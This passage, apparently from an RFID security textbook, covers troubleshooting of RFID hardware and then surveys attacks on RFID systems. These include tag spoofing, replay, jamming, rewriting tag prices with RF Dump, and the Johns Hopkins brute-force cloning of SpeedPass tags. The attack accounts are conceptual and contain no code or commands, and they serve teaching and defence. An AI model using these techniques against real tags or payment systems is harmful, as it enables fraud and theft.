sends its EPC to a host computer or application system running object naming 
service (ONS).
■ 
ONS A mechanism that uses domain name system (DNS) on the Internet to dis-
cover the information about an object that has been tagged with an EPC number 
(unique ID). ONS itself does not contain the information about the object, but it 
knows where the information is; for example, it knows the IP addresses of the servers 
that have the information.
■ 
Physical markup language (PML) A language that is used to write the data 
(information) about the object in the format that is convenient for communication. 
Once the information about an object is found, that needs to be communicated. 
PML is used to store and communicate that information. Because this information 
should be available throughout the EPCglobal network, we need a distributed data 
management system. That’s where Savant enters the picture.
■ 
Savant A speciﬁ cation developed by the Auto-ID center at MIT for a software 
system in the middle of data sources such as readers and enterprise applications. 
It provides a distributed data management system that manages the data for the 
objects being tracked in the EPCglobal network. Application-level events (ALE) 
is the new name of the game in this ﬁ eld.

228 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
In the context of managing the elements of an RFID system (e.g., tags and readers), you 
should also be aware of Simple Network Management Protocol (SNMP), which is used to 
remotely manage devices connected to a TCP/IP network and is based on two components, 
agent and manager. An agent, which is housed in a managed object, gathers information 
about the object (device). A manager sends requests to the agent to get information about the 
object and to execute commands on the object.
Once you ﬁ nd an item with a failed tag, what would you do? Depending on the 
situation, here are some of the solutions:
■ 
Use a backup such as a barcode when you print the smart labels. This will come in 
handy if the tag in the smart label fails.
■ 
Fix the tag, if it’s ﬁ xable.
■ 
Replace the tag with another tag.
An RFID system is composed of three elements: hardware, software, and data. Readers 
and tags can be considered hardware components that have data. There are some general 
techniques to monitor and troubleshoot hardware failures, which we discuss next.
Monitoring and Troubleshooting Hardware
A hardware failure is the failure of a hardware component to function to its speciﬁ cations. As 
an RFID professional, you should understand the causes of hardware failures and know the 
tips and techniques for diagnosing and troubleshooting hardware problems.
Understanding the Causes of Hardware Failures
An RFID system can experience hardware failures for a number of reasons, including the 
following:
NOTE
Details about Savant and ALE are outside the scope of this work. However, 
you should know why ALE is known as the speciﬁ cation for application event 
management systems. An event is deﬁ ned as some occurrence of interest in a 
device or a system. For example, a successful read of a tag by a reader is an 
event, and so is a read error. Managing the data from these events is called 
event management.

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
229
■ 
Damaged hardware components Following are some of the reasons for this 
damage:
■ Harsh environmental conditions such as extreme temperatures can damage 
hardware components.
■ Unregulated power supply of any sort can damage hardware components. 
This includes power surges from the regular power line or from lightning.
■ ESD and improper grounding of equipment can also contribute to the failure 
of hardware components.
■ 
Incompatible hardware components This could include readers and tags 
using different communication protocols or methods.
■ 
Unperformed reader ﬁ rmware upgrades Firmware upgrades were discussed 
in Chapter 3. The basic idea is that the readers’ ﬁ rmware must be compatible with 
the protocols being used by the tags that the reader is trying to read. The protocols 
are still evolving, so it’s very important that you buy readers whose ﬁ rmware is 
upgradeable.
TIP
Before starting to troubleshoot it, restart a misbehaving hardware component 
such as a reader to see if that simple action solves the problem. However, 
consider the consequences and impact of restarting a component of a running 
system. Thinking through a proposed solution is always a good idea.
Diagnosing RFID Hardware Failures
Following are some tips to diagnose and troubleshoot hardware failures:
■ 
Change Find out what has changed since the last time a failing component was 
working properly. The change could include the installation of new software or a 
new hardware component in the system. This step is always a good start in 
troubleshooting.
■ 
Veriﬁ cation Sometimes within a system, it’s not obvious that it is a given hard-
ware component that is causing the problem. In that case you need to verify the 
failure of that hardware component. One way of doing that is to replace the suspect 
component with a component that has just been tested and found working. If after 

230 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
replacement the problem goes away, you can conclude that the replaced component 
is failing.
■ 
Start simple Try the simplest thing ﬁ rst. For example, make sure the component 
is powered on if it is supposed to be, and inspect the cable connections—for 
example, between the interrogator and the antenna and between the interrogator 
and the network, and so on.
■ 
Network reachability To check the network connection and reachability, you 
can use the ping command, which is part of  TCP/IP.
CAUTION
When you are replacing or repairing a hardware component, take safety 
precautions. For example, make sure the power to the component is turned off.
Sometimes it’s obvious that a hardware component has failed. Other times it’s not, and 
you simply conclude from a problem that the system is experiencing a hardware component 
failure. In this case, you need to troubleshoot the problem.
Standard Troubleshooting Procedure
The following standard procedure works well for both hardware and software 
troubleshooting:
1. Identify and deﬁ ne the problem You identify and deﬁ ne the problem clearly 
by performing the following steps:
a. Establish symptoms You do this by observing the problem and collect-
ing information about the problem.
b. Identify the affected area You need to identify which area of the system 
is affected by the problem.
If you have identiﬁ ed and deﬁ ned the problem, in most cases you should be 
able to reproduce it.
2. Identify causes of the problem Once you have identiﬁ ed and deﬁ ned the prob-
lem, the next step is to ﬁ nd what is causing the problem. Remember, the cause of a 
problem could be another problem. The ﬁ rst step toward ﬁ nding the cause is to ask 
what has changed since the last time the system was working ﬁ ne. Use the method of 
elimination to narrow down and isolate the real cause. This involves eliminating 

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
231
relatively obvious causes or problems and making your way to more complex causes or 
problems.
3. Select the most probable cause Select the most probable cause and work on 
it. It’s important to work on one cause at a time, and make one change at a time, 
else you will not be able to map the effects with the cause.
4. Plan and implement a solution This can involve repair or replacement of a 
component.
5. Test the implementation After you have implemented a solution, you should 
test it and see if it solves the problem. Note and recognize the effects of the solution. 
Sometimes a solution can cause other problems.
6. Document the solution You must document your solution. This step is very 
important but is often ignored. Having good documentation will save you a lot of 
time and effort if the same problem appears again in the future. It will also be useful 
for the next RFID professional who will take your place, in case you move on.
It’s usually a good practice to replace a ﬁ eld replaceable unit (FRU) instead of trying to 
repair it. An FRU is a component of a system that a user or technician can quickly and easily 
remove from the system and replace without having to send the entire system to a repair 
facility.
The three most important takeaways from this chapter are the following:
■ 
Status monitoring consists of monitoring the status of a system and its devices 
(e.g., whether a device is powered on); performance monitoring consists of measuring 
the performance metrics of a system or a device.
■ 
By measuring the system performance metrics, you determine the normal values of 
these metrics. Signiﬁ cant variation in the values of some of these metrics can 
indicate instability of or problems with the system.
■ 
The standard troubleshooting procedure is identify the problem, identify the cause, 
implement the solution, test the solution, and document the solution.

232 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
Summary
Monitoring and troubleshooting are essential parts of running an effective RFID system. 
Usually nonintrusive information (collected during the normal operation of a system) is 
enough to ﬁ nd the status of a device, whereas intrusive information (collected as part of 
monitoring but not available as part of normal operation) might be needed to help you look 
deeply into the problem and ﬁ nd its root cause. You can ﬁ nd the root cause of a problem 
using root-cause analysis (RCA), which is the application of a set of problem-solving methods 
based on identifying and eliminating (or correcting) the root causes of a problem. Problems 
are identiﬁ ed during monitoring via either status monitoring or performance monitoring. 
Status monitoring consists of monitoring the basic status of the system and its devices, such as 
whether the reader is powered on; performance monitoring consists of monitoring the 
performance of a system and the devices in the system via measuring performance metrics 
such as such as readers’ read rates. By measuring the system performance metrics, you 
determine the normal values of these metrics; signiﬁ cant variation in the values of some of 
these metrics could indicate instability of or problems with the system. The causes of a 
problem can be found during troubleshooting, which has the following standard steps: identify 
the problem, identify the cause, implement the solution, test the solution, and document the 
solution.

Chapter 11 • Threat and Target Identiﬁ cation
Introduction
So far, we have learned how Radio Frequency Identiﬁ cation (RFID) works and how it is 
applied in both theory and real-world operations. This chapter discusses how security is 
implemented in RFID, and the possible attacks that can occur on RFID systems and 
applications.
Before we can analyze possible attacks, we have to identify potential targets. A target can 
be an entire system (if the intent is to completely disrupt a business), or it can be any section 
of the overall system (from a retail inventory database to an actual retail item).
Those involved in information technology security tend to concentrate solely on 
“protecting the data.” When evaluating and implementing security around RFID, it is 
important to remember that some physical assets are more important than the actual 
data. The data may never be affected, even though the organization could still suffer 
tremendous loss.
Consider the following example in the retail sector. If an individual RFID tag was 
manipulated so that the price at the Point of Sale (POS) was reduced from $200.00 to 
$19.95, the store would suffer a 90 percent loss of the retail price, but with no damage to 
the inventory database system. The database was not directly attacked and the data in the 
database was not modiﬁ ed or deleted, and yet, a fraud was perpetrated because part of the 
RFID system had been manipulated.
In many places, physical access is controlled by RFID cards called “proximity 
cards.” If a card is duplicated, the underlying database is not affected, yet, whoever 
passes the counterfeit card receives the same access and privileges as the original 
cardholder.
Attack Objectives
To determine the type of an attack, you must understand the possible objectives of that 
attack, which will then help determine the possible nature of the attack.
Someone attacking an RFID system may use it to help steal a single object, while 
another attack might be used to prevent all sales at a single store or at a chain of stores. 
An attacker might want misinformation to be placed in a competitor’s backend database 
so that it is rendered useless. Other people may want to outmaneuver physical access 
control, while having no interest in the data. Therefore, it is necessary for anyone looking 
at the security of an RFID system to identify how their assets are being protected and how 
they might be targets.

 
Threat and Target Identification • Chapter 11 
237
Just as there are several basic components to RFID systems, there are also several methods 
(or vectors) used for attacking RFID systems. Each vector corresponds to a portion of the 
system. The vectors are “on-the-air” attacks, manipulating data on the tag, manipulating 
middleware data, and attacking the data at the backend. The following sections brieﬂ y discuss 
each of these attacks.
Radio Frequency Manipulation
On of the simplest ways to attack an RFID system is to prevent the tag on an object from 
being detected and read by a reader. Since many metals can block radio frequency (RF) 
signals, all that is needed to defeat a given RFID system is to wrap the item in aluminum 
foil or place it in a metallic-coated Mylar bag. This technique works so well, that New York 
now issues a metallic-coated Mylar bag with each EZPass.
From the standpoint of over-the-air attacks, the tags and readers are seen as one entity. 
Even though they perform opposite functions, they are essentially different faces of the same 
RF portion of the system.
An attack-over-the air-interface on tags and readers typically falls into one of four types 
of attacks: spooﬁ ng, insert, replay, and Denial of Service (DOS) attacks.
Spooﬁ ng
Spooﬁ ng attacks supply false information that looks valid and that the system accepts. 
Typically, spooﬁ ng attacks involve a fake domain name, Internet Protocol (IP) address, or 
Media Access Code (MAC). An example of spooﬁ ng in an RFID system is broadcasting an 
incorrect Electronic Product Code™ (EPC™) number over the air when a valid number was 
expected.
Insert
Insert attacks insert system commands where data is normally expected. These attacks work 
because it is assumed that the data is always entered in a particular area, and little to no 
validation takes place.
Insert attacks are common on Web sites, where malicious code is injected into a 
Web-based application. A typical use for this type of attack is to inject an Structured Query 
Language (SQL) command into a database. This same principle can be applied in an RFID 
situation, by having a tag carry a system command rather than valid data in its data storage 
area (e.g., the EPC number).

238 
Chapter 11 • Threat and Target Identiﬁ cation
Replay
In a replay attack, a valid RFID signal is intercepted and its data recorded, which is later 
transmitted to a reader where it is “played back.” Because the data appears valid, the system 
accepts it.
DOS
DOS attacks, also known as flood attacks, take place when a signal is flooded with more 
data than it can handle. They are well known because several large DOS attacks have 
impacted major corporations such as Microsoft and Yahoo. A variation on this is RF 
jamming, which is well known in the radio world, and occurs when the RF is filled 
with a noisy signal. In either case, the result is the same: the system is denied the ability 
to correctly deal with the incoming data. Either variation can be used to defeat RFID 
systems.
Manipulating Tag Data
We have learned how blocking the RF might work for someone attempting to steal a 
single item. However, for someone looking to steal multiple items, a more efficient way 
is to change the data on the tags attached to the items. Depending on the nature of the 
tag, the price, stock number, and any other data can be changed. By changing a price, a 
thief can obtain a dramatic discount, while still appearing to buy the item. Other 
changes to a tag’s data can allow users’ to buy age-restricted items such as X- or 
R-rated movies.
When items with modiﬁ ed tags are bought using a self-checkout cash register, no one 
can detect the changes. Only a physical inventory would reveal that shortages in a given item 
were not matching the sales logged by the system.
In 2004, Lukas Grunwald demonstrated a program he had written called “RF Dump.” 
RF Dump is written in Sun’s Java language, and runs on either Debian Linux or Windows 
XP operating systems for PCs. The program scans for RFID tags via an ACG brand reader 
attached to the serial port of a computer. When the reader recognizes a card, the program 
presents the card data in a spreadsheet-like format on the screen. The user can then enter or 
change data and reﬂ ect those changes on the tag. RF Dump also makes sure that the data 
written is the correct length for the tag’s ﬁ elds, by either padding zeros or truncating extra 
digits as needed.
Alternately, a Personal Digital Assistant (PDA) titled “RF Dump-PDA” is available for 
use on PDAs such as the Hewlett-Packard iPAQ PocketPC. RF Dump-PDA is written in 
the Practical Extraction and Reporting Language (PERL), and will run on PocketPCs 
running the Linux operating system. Using a PDA and RF Dump-PDA, a thief can walk 
through a store and change the data on items with the ease of using a hand-held 
PocketPC.

 
Threat and Target Identification • Chapter 11

Grunwald demonstrated the attack using the same EPC-based RFID system that the 
Future Store in Rheinberg, Germany uses (see www.future-store.org). The Future Store is 
designed to be a working supermarket and a live technology-demonstration store, and is 
owned and run by Metro AG, Germany’s largest retailer and the ﬁ fth largest retail chain 
in the world.
Middleware
Middleware attacks can happen at any point between the reader and the backend. Let’s look 
at a theoretical attack on the middleware of the Exxon Mobil SpeedPass system.
■ 
The customer’s SpeedPass RFID tag is activated by the reader over the air. The 
reader is connected to the pump or a cash register. The reader handshakes with 
the tag and reads the encrypted serial number.
Figure 11.1 RF Dump Changing a Retail Tag’s Data

240 
Chapter 11 • Threat and Target Identiﬁ cation
■ 
The reader and pump are connected to the gas station’s data network, which in 
turn is connected to a Very Small Aperture Terminal Satellite (VSAT) satellite 
transceiver in the gas station.
■ 
The VSAT transceiver sends the serial number to an orbiting satellite, which in 
turn, relays the serial number to a satellite earth station.
■ 
From the satellite earth station, the serial number is sent to ExxonMobil’s data 
center. The data center veriﬁ es the serial number and checks for authorization on 
the credit card that is linked to the account.
■ 
The authorization is sent back to the pump following the above route, but in reverse.
■ 
The cash register or pump receives authorization and allows the customer to make 
their purchase.
At any point in the above scenario, the system may be vulnerable to an outside attack. 
While requiring sophisticated transmitters systems, attacks against satellite systems have 
happened from as far back as the 1980s.
However, the weakest point in the above scenario is probably the local area network 
(LAN). This device could be snifﬁ ng valid data to use in a replay attack, or it could be 
injecting data into the LAN, therefore causing a DOS attack against the payment system. 
This device could also be allowed unauthorized transmissions.
Another possibility might be a technically sophisticated person taking a job in order to 
gain access to the middleware. Some “social engineering” attacks take place when someone 
takes a low paying job that permits access to a target system.
Further along the data path, the connection between the satellite’s earth station and the 
data center where the SpeedPass numbers are stored, is another spot where middleware can 
be inﬂ uenced. The connections between the data center and the credit card centers are also 
points where middleware data may be vulnerable.
Backend
Because the backend database is often the furthest point away from the RFID tag, both in a 
data sense and in physical distance, it may seem far removed as a target for attacking an 
RFID system. However, it bears pointing out that they will continue to be targets of attacks 
because they are, as Willy Sutton said, “where the money is.”
Databases may have some intrinsic value if they contain such things as customers’ credit 
card numbers. A database may hold valuable information such as sales reports or trade secrets, 
which is invaluable to a business competitor.
Businesses that have suffered damage to their databases are at risk for losing the 
conﬁ dence of consumers and ultimately their market share, unless they can contain the 
damage or quickly correct it. The business sections of newspapers and magazines have 

 
Threat and Target Identification • Chapter 11 
241
reported many stories regarding companies suffering major setbacks because consumer 
conﬁ dence dropped due to an IT-related failure.
Manipulated databases can also have real-world consequences beyond the loss of 
consumers’ buying power. It is conceivable that changing data in a hospital’s inventory 
system could literally kill people or changing patient data on the patient records database 
could be deadly. A change of one letter involving a patient’s blood type could put that 
person at risk if they received a transfusion. Hospitals have double and triple checks in place 
to combat these types of problems; however, checks will not stop bad things from happening 
due to manipulated data; they can only mitigate the risk.
Blended Attacks
Attacks can be used in combinations. The various attacks seen in opposition to RFID systems 
have also been made against individual subsystems. However, the increased cleverness of those 
who attack RFID systems will probably lead to blended attacks. An attacker might attack the 
RF interface of a retailer with a custom virus tag, which might then tunnel through the 
middleware, ultimately triggering the backend to dump credit card numbers to an unknown 
Internet site via an anonymous server.

Chapter 12 • RFID Attacks: Tag Encoding Attacks
Introduction
As with any system, Radio Frequency Identiﬁ cation (RFID) is vulnerable to attack. People 
that work in information security know that any system, including a RFID, can be 
compromised given enough time and effort. The Exxon-Mobil SpeedPass is a great example 
of a system that, given enough time and interest from researchers, became a target for 
research on many fronts.
Case Study: John Hopkins vs. SpeedPass
In 1997, Mobil Oil launched a new payment system for their gas stations and convenience 
stores called “SpeedPass,” which is based on the Texas Instruments DST (Digital Signal 
Transponder) RFID tag technology. In 2001, Exxon purchased Mobil Oil and adopted the 
same system for their gas stations and convenience stores. Since that time, over 6 million tags 
have been deployed and are actively being used in the US, which is arguably one of the 
largest and most public uses of RFID technology to date. Because it is ubiquitous, many 
people do not realize that they use RFID technology on a daily basis.
A tag is given to the consumer on a key-chain fob and then linked to their credit card 
or checking account. Passing the tag past a reader automatically charges the credit card or 
checking account for that purchase amount. It is convenient for the consumer, and 
subsequently has led to a marked increase in purchases and brand loyalty.
It works like many RFID implementations. To make a purchase, the consumer passes the 
tag in front of the reader at the pump or on the counter in the store. The reader then queries 
it for the ID number that it is linked to the proper account. This system is the ﬁ rst of its kind 
and has been very successful.
As people became more aware of security, more questions were raised regarding these 
transactions. Two teams were formed to test the security of the SpeedPass system. One 
team consisted of RenderMan (the author) and his associate, G-man. The other group 
consisted of several Johns Hopkins University students and faculty, and two industry 
scientists.
The SpeedPass
The SpeedPass is an implementation of the Texas Instruments Radio Identiﬁ cation System 
(TIRIS) 134.2 kHz DST tag system. The key fob contains a 23 mm hermetically sealed glass 
transponder that looks like a small, glass pill, and the fob is a plastic key chain that holds the 
transponder. The whole package is small and easy to carry. It is a passive device, meaning 
there is no internal power source. The power is provided through induction from the Radio 
Frequency (RF) ﬁ eld of the reader at the pump or in the store. This keeps the package small 

 
RFID Attacks: Tag Encoding Attacks • Chapter 12 
245
and the costs low, and eliminates the cost of supporting and replacing consumers tags. Tags 
will wear out over time, but replacement costs are low.
While many tags merely respond to a query from a reader by returning an ID number, 
the DST tag is different. Each tag has a unique “key” embedded at manufacture that is never 
transmitted. When the reader queries the tag, it sends a “challenge” ’ to the tag. The tag 
responds with its ID number and a “response” (the challenge) encrypted with the unique 
key from the tag. At the same time, the reader calculates what the response should be for that 
ID number tag and whether the two values match. (It assumes the tag is the same one 
entered into its system.) Because it can verify the key, the necessary level of security is added 
in order to use the system in a ﬁ nancial transaction.
The other major advantage is the absence of user interaction. When the tag is in range of 
the reader, the reader sends out a 40-bit challenge value, which is then taken by the tag and 
encrypted with its 40-bit key. The results sent back to the reader is a 24-bit value and a 
unique 24-bit identiﬁ er for the tag. This identiﬁ er is programmed at the factory and is what 
the backend database uses to link you to your account details (basically an account number). 
The reader uses the same 40-bit challenge and the 24-bit identiﬁ er in its own encryption 
method to verify that the 24-bit response is the correct one for that tag.
The TIRIS DST tag used in the SpeedPass is also used in vehicle immobilizer systems on 
many late model vehicles. These vehicles have readers embedded in the steering column that 
query the tag when the vehicle is being started and will not let fuel ﬂ ow to the fuel injectors 
unless the tag is veriﬁ ed as the one entered into the automobile’s computer. This adds 
another layer to vehicle security. Now you need to have a key cut for that vehicles’ ignition 
lock, and you also need the correct transponder. Hopefully, this added layer of security acts as 
a deterrent for any would-be thief.
The RFID’s small size and light computing power makes it cheap; however, it is also its 
own major security deﬁ ciency; the tags do not have enough computing power to do 
encryption. The best way to build the system is to use a known algorithm that has been 
through peer review. However, the only problem with some of those algorithms is that they 
are very processing-power intensive. Therefore, the TIRIS system is built upon a proprietary 
encryption algorithm and is not publicly available. This is a classic case of security by 
obscurity, which has proven to be a bad idea. The only way to ﬁ nd out what was occurring 
inside the chip was to sign an Non-Disclosure Agreement (NDA) with Texas Instruments, 
which forbids you from publicly discussing the details. So, other than the manufacturer’s 
claims of “trust us,” there was no way to verify or test the systems security.
Over the years, there have been serious discussions regarding system security. The key 
used for encryption was 40 bits long and had not been updated since 1997. As information 
about RFID started to increase, so did questions about SpeedPass. The suitability of 40-bit 
encryption was inadequate in other encryption algorithms, which left the impression that 
the SpeedPass was vulnerable.

Notes from the Underground…
Private Encryption - A Bad Policy
Many encryption schemes enter the market using phrases like, “Million bit encryption,” 
“Totally uncrackable,” or “Hacker proof.” When questioned about the security they 
offer, the usual response is “trust us,” which usually winds up hurting the 
consumer.
Cryptographers have long believed that encryption system security should be 
based on key security rather than algorithm security.
A system of “peer review” exists where cryptographers share their encryption 
algorithms and try to break them. Over time, the strong algorithms stand up to the 
challengers, and the weak algorithms are pushed aside. Sometimes an encryption 
system lasts for decades.
Private or proprietary algorithms do not help advance security. Often, the only 
people who analyze proprietary cryptographic systems are the ones who designed it, 
and it is in their best interests not to ﬁ nd a ﬂ aw. Having a community of professional 
cryptographers and amateurs review an algorithm from different angles and viewpoints, 
and having it stand the test of time, is a sureﬁ re way to know whether an encryption 
algorithm is trustworthy. Manufacturers who do not use the peer review system usually 
ﬁ nd themselves marginalized and out of business, because the public does not trust 
them.
The research began in 2003. The question of the SpeedPass system was raised during 
several discussions at various computer security conferences. Because of the limited amount 
of information available at that time, there were serious doubts about the system and its 
security; no one knew any details beyond the marketing brochures at Exxon-Mobil stations. 
My curiosity piqued, I began looking for information about possible problems with the 
SpeedPass system. To my surprise, there was little information about the system from an 
independent security perspective; no one had looked at the system in any great depth. The 
only information I found was a post to the comp.risks newsgroup from 1997; the rest was 
marketing material and trade journals.

Mobil is promoting the SpeedPass program in which you get a radio 
frequency transponder and use that to pay for fuel at the pump in a

service station. They are apparently using TIRIS technology from 
Texas Instruments. The key-ring version uses fairly short-range, 
low-frequency energy, and I’d have to guess that the car-mounted 
version is using their 915 MHz battery-powered transponder. This is a 
neat application, especially for ﬂ eet vehicles, especially since no PIN is 
required. But, I worked with RF transmitter and transponder security 
in my previous job, and this application rings minor alarm bells in 
my mind.
■ 
The risks’ TIRIS (and, in general, any cheap RF) technology is not 
terribly secure against interception and theft of your identiﬁ cation 
number. It seems to me that the car-mounted device would present 
the greater risk, since it is pretty much the same technology that is 
also being sold for electronic tollbooth collection. So, if you “ping” 
a vehicle with a mounted SpeedPass transponder, you can get its 
code and potentially use it to buy fuel until the code is reported 
stolen. The risk is analogous to someone reading your telephone 
credit card at an airport without you knowing it. Yes, the 915 MHz 
TIRIS device is encrypted, but unless they’ve improved their crypto 
in the year or so since I checked up on them, I wouldn’t consider it 
truly secure. (For crypto geeks, the TIRIS device I looked into used 
rolling-code transmissions with a ﬁ xed-feedback Linear Feedback 
Shift Register (LFSR) using the same polynomial for all devices; each 
device simply starts with a different seed number. So, once you 
trivially determine the polynomial from one transponder you only 
need one interception to crack any other unit. Maybe they’ve 
improved recently – they don’t advertise that level of detail at 
their Web site.)
■ 
To their credit, Mobil reassured me that the TIRIS code isn’t the same 
as your credit card number (so they’re not broadcasting your credit 
card number over the airwaves, which is good) and that someone 
would have to know your date of birth and social security number to 
retrieve the credit card number from their information system (well, 
maybe I’m not so re-assured after all). The real risk is that ultra-low-cost 
devices usually don’t have enough room for strong cryptography, and 
often use pretty weak cryptography; but to a lay-person saying it is 
“encrypted” conveys a warm, fuzzy feeling of security. Perhaps theft 
of a bit of vehicle fuel isn’t a big deal (although for long-haul trucks 
a full tank isn’t cheap), and certainly pales by comparison to cell 
phone ID theft. But, you’d think they would have learned the lesson 
about RF broadcast of ID information. I wonder how long it will be 
until the key-ring SpeedPass is accepted as equivalent to a credit card 
for other purchases… and considered indisputable because it is 
encrypted.

Phil Koopman’s post discussed the vehicle-mounted version of the system, which was 
slightly different, but the only version similar to the available research.
The lack of information about the system (e.g., no indication of any attacks on the 
system; limited non-marketing security information, and so forth) did not instill a sense of 
trust. As such, in 2003, I decided to try attacking the system.
Breaking the SpeedPass
The ﬁ rst step in attempting to break the SpeedPass was to obtain the necessary parts that 
interact with the tags. Care was taken to avoid using any Exxon-Mobil equipment in the 
initial stages, because we did not want a legal battle with Exxon-Mobil.
Tools & Traps…
Reverse Engineering
Reverse engineering is the process by which you take a ﬁ nished product and ﬁ gure out 
how it was made. It has long been used to produce compatible devices without actually 
having to license the technology.
One of the most famous feats of reverse engineering was the PC Basic Input 
Output System (BIOS). In the early 1980s, IBM was the only producer of PCs. Anyone 
who wanted to produce a computer running the same software needed the same 
BIOS. The PC BIOS was copyrighted by IBM because they did not want competition, 
which stiﬂ ed consumer selection and development.
A group at Phoenix Technologies in San Jose, California, wanted to produce 
a PC BIOS that would allow them to run IBM software without having an IBM PC 
BIOS. The Phoenix team used the “clean room” technique of reverse engineering, 

 
RFID Attacks: Tag Encoding Attacks • Chapter 12 
249
so named because those that do reverse engineering are “clean” of any outside code 
or information that could possibly violate copyrights and patents. The team studied the 
IBM BIOS and wrote a technical description of what it did, avoiding reference to the 
actual copyrighted code. They then handed it off to a group of programmers who had 
never seen the code from the IBM BIOS, but were able to produce a BIOS that did the 
same thing without IBM code. Since it was not IBM code, IBM could not stop them from 
producing this new BIOS, which led to the explosion of the PC market, because now any-
one could produce an “IBM-compatible” computer without having to license it.
Reverse engineering is like someone handing you a compact disc and a description 
of how music is encoded onto it and saying, “Build a player for this.” This can lead to 
new innovations and new approaches, which moves technology forward. If it were not 
for the efforts of Phoenix Technologies, we would not have a variety of computers or 
competitive prices.
Unfortunately, the right to reverse engineering is under assault, because companies 
do not want others to know how their items work. Laws like the Digital Millennium 
Copyright Act (DMCA) forbid people from reverse engineering any technologies used 
for copy protection. Many programs and products are now sold with licenses that 
expressly forbid reverse engineering, which has the effect of stiﬂ ing research and, in 
the case of products used for security, prevents people from knowing if their product 
is secure.
Tools & Traps…
Legalities
Attempting any sort of reverse engineering is a legal mine ﬁ eld. While allowed under 
many copyright and patent laws, some companies try to ignore that right.
In 2003, the Recording Industry Association of America put forth a challenge to 
try and defeat several proposed digital rights management schemes for music. They 
offered a prize for successfully defeating any or all of the schemes; however, to be 
eligible for the prize you had to sign several NDAs and agreements before participat-
ing, which included a ban on publishing the methods of attack. Several teams opted 
not to go for the prize and attempted to break the system without signing the NDAs. 
Professor Edward Felten and his team successfully defeated many of the schemes 
presented. They found themselves embroiled in a lawsuit to prevent their research 
from being presented.

250 
Chapter 12 • RFID Attacks: Tag Encoding Attacks
We were attempting to see if we could reverse engineer the encryption algorithm of the 
SpeedPass tag. If we knew the algorithm and captured a known challenge/response, we 
could run a brute force attack to look for the key that provided the response (e.g., algebra, 
where you know one of the values going into the equation, you know the result, but you 
still have to locate the missing part of the equation. This was not the best method, but was 
the most likely to work.
We used the software provided with the reader to collect challenge/responses. The 
application to read the codes from normal read-only tags and to write to read-write tags, 
was also included in the kit. There were also functions for interacting with DST tags, which 
consisted of a dialog box for specifying the challenge to send to the tag, and a dialog box to 
display the response. We also utilized a serial sniffer to verify all of the information going 
over the wire to and from the reader.
Research progressed slowly. A large number of reader challenges and responses were 
made, and a breakdown of communication occurred. Several patents were located that 
provided clues to the encryption process; however, my team was not experienced in 
cryptanalysis, so things moved very slowly.
In January 2005, the team from Johns Hopkins University published their ﬁ ndings on 
www.rﬁ danalysis.org. They accomplished what my team had been trying to do for two 
years; they successfully reverse-engineered the algorithm, brute-forced the key for a tag, and 
simulated its software, thus “cloning” the transponder.
My team consisted of two people with a lot of spare time to work on the project. The Johns 
Hopkins team had three graduate students, one faculty member, two industry scientists (including 
one from RSA Labs), a proper lab, and a much larger budget. My team never had a chance.
The Johns Hopkins Attack
The Johns Hopkins team began by obtaining an evaluation kit and a number of DST tags 
from Exxon-Mobil. They also located a copy [on the Internet] of presentation slides that 
gave them a rough outline of the encryption working inside the tags. This would prove to be 
a major ﬁ nd and the key ingredient.
The Johns Hopkins team employed a “black box” method to ﬁ gure out the details of the 
algorithm. This method of research is where input goes into a “proverbial” black box and 
then the output is observed. From these observations, and using specially chosen input, it 
became possible to construct a process that would produce the same output as the black box. 
The ingenuity of this method is that you are simulating the exact mechanics of the black 
box, but achieving the same output through a different method. This method also avoided 
any legal issues, because the team did not violate any NDAs.

 
RFID Attacks: Tag Encoding Attacks • Chapter 12 
251
Through detective work, the team uncovered a rough diagram of the encryption 
algorithm. Armed with the outline, the Johns Hopkins team began the arduous task of ﬁ lling 
in the blanks and tracing each bit of the encrypted challenge. They did this by putting in 
specially selected challenges and comparing the output. (In a simpliﬁ ed version, this would 
be like putting challenge “2” into the black box and observing “4” as the response.) After a 
short time, each digit is squared. By mapping out the relationships between the input and 
output bits, they were able to ﬁ ll in the missing parts of the algorithm in order to 
understand the internal mechanisms of the tag.

252 
Chapter 12 • RFID Attacks: Tag Encoding Attacks
Now that they had reverse-engineered the internal mathematics of the DST tag, they 
were able to write a piece of software to accurately simulate the internal encryption of the 
DST tags. With this, they were able to brute-force the key for that tag.
Notes from the Underground…
Brute Force vs. Elegant Solution
In the world of information security, there are multiple ways of obtaining identical 
results. Compromising a computer network, writing a program, and other tasks, usu-
ally fall into one of two categories: brute force or elegant solution.
The elegant solution model provides a new, “quiet” way of doing things, and the 
brute force method provides the “loudest” and “ugliest” way to get the job done.
Consider a locked door in a real-world analogy. An elegant solution would be to 
look under the doormat, pick the lock, or shim the door open. The brute force method 
would be to drill out the lock, or throw a brick through the window. Both methods 
achieve the same result, but the elegant solution is best.
An elegant solution for defeating encryption is to ﬁ nd a ﬂ aw in the algorithm 
that was created to guess the key encryption. The brute-force method tries every pos-
sible key until it gets the correct one, which may not be the fastest method, but 
achieves the same result.
At this point, the system became weaker, because it relied on a proprietary “secret” 
algorithm. Potential attacks could not verify or clone the operations of a valid tag until that 
algorithm was known. Once they had the internals of the algorithm, a captured challenge/
response pair for the tag was all they needed.
Given the size of a 40-bit key space (109,951,1627,776), it would have taken the Johns 
Hopkins team several weeks to recover a key for a single device using an ordinary desktop 
computer. At this point, it is just the matter of how much time an attacker is willing to 
spend on one recovered key. To prove the feasibility of a real-world attack, the brute-forcing 
time would have to be reduced by several orders of magnitude, and be cost-effective enough 
for a real-world attacker to afford.
To do this, the team used a Field Programmable Gate Array (FPGA), which is basically 
a computer processor that can be reprogrammed for specialized tasks such as testing new 
processor designs or, in this case, cracking codes. They programmed the FPGA to test 

 
RFID Attacks: Tag Encoding Attacks • Chapter 12 
253
32 keys at once in parallel. One FPGA was expected to crack a key in just over 10 hours; 
not a lot of time for an attack, but good enough for the team. The Johns Hopkins team 
went one step further and built an array of 16 FPGAs working in parallel that, given two 
challenge/response pairs, recovered the key in under an hour.
Now, the attack was a real possibility. With processor speeds getting ever faster, it is only 
a matter of time before a standard home computer can crack keys in minutes.
In January 2005, the team released their ﬁ ndings amid a lot of media attention and 
curiosity. The “secure” system had proven to be vulnerable to a determined attacker. While 
not a complete break of the system, it indicated that the now seven-year-old system was 
starting to age and that a replacement should be considered.
The team also tested the feasibility of an attacker lifting the necessary challenge/response 
